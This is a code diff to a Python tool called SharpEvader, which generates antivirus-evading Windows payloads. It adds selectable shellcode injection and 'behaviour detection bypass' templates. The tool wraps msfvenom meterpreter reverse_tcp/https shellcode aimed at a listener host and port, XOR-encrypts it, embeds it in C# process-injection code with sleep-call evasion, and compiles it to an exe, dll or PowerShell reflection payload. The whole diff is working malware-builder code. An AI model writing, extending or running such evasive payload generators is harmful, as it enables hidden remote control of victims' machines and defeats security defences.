@@ -78,7 +78,6 @@ def cleanup():
         logger.debug("Temporary directory /tmp/sharpevader_tmp/ missing, Exiting without cleanup...")
     
 
-
 def main():
     # Inserting the argparser arguments
     global args
@@ -91,8 +90,50 @@ def main():
         logger.debug(f"Arguments : {args}")
     # Printing the Datetime when the command is run
     current_time = datetime.datetime.fromtimestamp(time.time()).strftime("%d/%m/%Y %I:%M:%S %p")
-    print_data(f"{bold}{blue}SharpEvader\t\t{green}{args.lh}\t\t{orange}{args.lp} {end}{blue}{bold}\t\t[*]{end}  Starting Payload Generation Process @ {bold}{teal}{current_time}{end}",level=logger.level)
+    print_log(f"{bold}{blue}[*]{end}  Starting Payload Generation Process @ {bold}{teal}{current_time}",args.lh,args.lp,level=logger.level)
     
+    # def generate_csharp_payload(template,shellcode,decryption_routine,behaviour_bypass,markers):
+    script_path = os.path.dirname(os.path.abspath(__file__))
+    with open(f"{script_path}/payloads/injection_templates/injection_list.yaml","r") as f:
+        evasion_style = yaml.load(f, Loader=yaml.SafeLoader)
+    with open(f"{script_path}/payloads/behaviour_bypass/behaviour_bypass.yaml","r") as f:
+        behaviour_bypass = yaml.load(f, Loader=yaml.SafeLoader)
+
+    # Creating a list of the available shellcode injection templates
+    available_evasion_csharp_templates = list(evasion_style["payload_types"].keys())
+    available_behaviour_bypass_templates = list(behaviour_bypass["behaviour_detection_bypass"].keys())
+
+    # If no argument is supplied it would use the best injection process_inject
+    if args.sit == None:
+        args.sit = "process_inject"
+    if args.bb == None:
+        args.bb = "sleep_calls"
+
+    # Converting the arguments into lower case
+    args.sit = args.sit.lower()
+    args.bb = args.bb.lower()
+
+    # Error out if invalid shellcode injection template is used in the argument
+    if args.sit not in available_evasion_csharp_templates:
+        print_log(f"{red}{bold}[-]{end}  Unrecognised Shellcode Injection Method : {bold}{teal}{args.sit}",args.lh,args.lp,level=logger.level)
+        print_log(f"{blue}{bold}[*]{end}  Following Shellcode Injection Method are available : ",args.lh,args.lp,level=logger.level)
+
+        for each in available_evasion_csharp_templates:
+            print_log(f"{blue}{bold}[*]{end}  {bold}{yellow}{each}",args.lh,args.lp,level=logger.level)
+        exit()
+    # Error out if invalid behavioural detection template is used in the argument
+    if args.bb not in available_behaviour_bypass_templates:
+        print_log(f"{red}{bold}[-]{end}  Unrecognised Behavioural Detection Bypass Method : {bold}{teal}{args.bb}",args.lh,args.lp,level=logger.level)
+        print_log(f"{blue}{bold}[*]{end}  Following Behavioural Detection Bypass Methods are available : ",args.lh,args.lp,level=logger.level)
+
+        for each in available_behaviour_bypass_templates:
+            print_log(f"{blue}{bold}[*]{end}  {bold}{yellow}{each}",args.lh,args.lp,level=logger.level)
+        exit()
+
+    # Opening the csharp template which is supplied from the argument
+    with open(f"{script_path}/payloads/injection_templates/{evasion_style['payload_types'][args.sit]['payload_file']}","r") as f:
+        csharp_template = f.readlines()
+
     # Setting the File Formats
     if args.dll:
         mode = "dll"
@@ -100,16 +141,20 @@ def main():
         mode = "exe"
     extenstions = f"{mode}" if args.nops1 else f"{mode},ps1"
     reflection = False if args.nops1 else True
-    print_data(f"{bold}{blue}SharpEvader\t\t{green}{args.lh}\t\t{orange}{args.lp} {end}{blue}{bold}\t\t[*]{end}  Signature Bypass : {teal}{bold}Process Hollowing{end}\tHeuristic Bypass : {teal}{bold}Sleep Calls{end}",level=logger.level)
 
-    print_data(f"{bold}{blue}SharpEvader\t\t{green}{args.lh}\t\t{orange}{args.lp} {end}{blue}{bold}\t\t[*]{end}  Format : {teal}{bold}{extenstions}{end}\t\t\t\tPowershell Reflection : {teal}{bold}{reflection}{end}",level=logger.level)
+    # Printing the Shellcode Obfuscation Technique and Behaviour Detection Bypass payload
+    print_log(f"{bold}{blue}[*]  {end}Shellcode Injection Technique : {bold}{teal}{evasion_style['payload_types'][args.sit]['process_name']}",args.lh,args.lp,level=logger.level)
+    print_log(f"{bold}{blue}[*]{end}  Signature Bypass : {teal}{bold}XOR Encryption{end}\t\tHeuristic Bypass : {teal}{bold}{behaviour_bypass['behaviour_detection_bypass'][args.bb]['title']}{end}",args.lh,args.lp,level=logger.level)
+    print_log(f"{bold}{blue}[*]{end}  Format : {teal}{bold}{extenstions}{end}\t\t\t\tPowershell Reflection : {teal}{bold}{reflection}",args.lh,args.lp,level=logger.level)
     
     # Checking if the user is using untested payloads
     if args.p not in ["windows/x64/meterpreter/reverse_tcp","windows/x64/meterpreter/reverse_https"]:
-        print_data(f"{bold}{blue}SharpEvader\t\t{green}{args.lh}\t\t{orange}{args.lp} {end}{yellow}{bold}\t\t[!]  You are using an untested payload {args.p} this may not work {end}",level=logger.level)
-        print_data(f"{bold}{blue}SharpEvader\t\t{green}{args.lh}\t\t{orange}{args.lp} {end}{yellow}{bold}\t\t[!]  Following are the tested payloads : ",level=logger.level)
-        print_data(f"{bold}{blue}SharpEvader\t\t{green}{args.lh}\t\t{orange}{args.lp} {end}{blue}{bold}\t\t[*]  {lgreen}{bold}windows/x64/meterpreter/reverse_tcp{end}",level=logger.level)
-        print_data(f"{bold}{blue}SharpEvader\t\t{green}{args.lh}\t\t{orange}{args.lp} {end}{blue}{bold}\t\t[*]  {lgreen}{bold}windows/x64/meterpreter/reverse_https{end}",level=logger.level)
+        print_log(f"{yellow}{bold}[!]  You are using an untested payload {args.p} this may not work {end}",args.lh,args.lp,level=logger.level)
+        print_log(f"{blue}{bold}[*]  Use one of the following tested payloads for best results : ",args.lh,args.lp,level=logger.level)
+        
+        supported_msf_payloads = ["windows/x64/meterpreter/reverse_tcp","windows/x64/meterpreter/reverse_https"]
+        for each in supported_msf_payloads:
+            print_log(f"{blue}{bold}[*]  {lgreen}{bold}{each}",args.lh,args.lp,level=logger.level)
     
     
     # Generating the msfvenom payload and placing it in the /tmp/sharpevader_tmp/msf_shellcode.hex
@@ -119,18 +164,8 @@ def main():
     integer_shellcode = read_and_convert_shellcode()
     scrambled_shellcode, key, decryption_routine_cs = xor_encryptor(integer_shellcode)
 
-
-    # def generate_csharp_payload(template,shellcode,decryption_routine,behaviour_bypass,markers):
-    script_path = os.path.dirname(os.path.abspath(__file__))
-    with open(f"{script_path}/payloads/injection_templates/injection_template_marker.yaml","r") as f:
-        injection_markers = yaml.load(f, Loader=yaml.SafeLoader)
-    with open(f"{script_path}/payloads/injection_templates/process_injection.cs","r") as f:
-        csharp_template = f.readlines()
-    with open(f"{script_path}/payloads/behaviour_bypass/main.yaml","r") as f:
-        behaviour_bypass = yaml.load(f, Loader=yaml.SafeLoader)
-
     # Generating the final csharp code with all the bypasses baked in
-    final_csharp_template = generate_csharp_payload(csharp_template,scrambled_shellcode,decryption_routine_cs,behaviour_bypass["behaviour_detection_bypass"]["sleep_calls"],injection_markers["injection_markers"]["process_injection.cs"])
+    final_csharp_template = generate_csharp_payload(csharp_template,scrambled_shellcode,decryption_routine_cs,behaviour_bypass["behaviour_detection_bypass"][args.bb],evasion_style["payload_types"][args.sit])
 
     # Writing the file in the /tmp/sharpevader_tmp/magisk.cs
     logger.debug(f"Writing the csharp file into /tmp/sharpevader_tmp/magisk.cs")
@@ -140,7 +175,8 @@ def main():
     
     # Compiling the csharp code
     compile_csharp_code(mode=mode,nobin=args.nobin)
-    print_data(f"{bold}{blue}SharpEvader\t\t{green}{args.lh}\t\t{orange}{args.lp} {end}{green}{bold}\t\t[+]{end}  Payload generated : {bold}{teal}{cwd}/rev.{mode}{end}",level=logger.level)
+    print_log(f"{green}{bold}[+]{end}  Payload generated : {bold}{teal}{cwd}/rev.{mode}",args.lh,args.lp,level=logger.level)
+    
     # Cleaning up the /tmp directory
     cleanup()
 
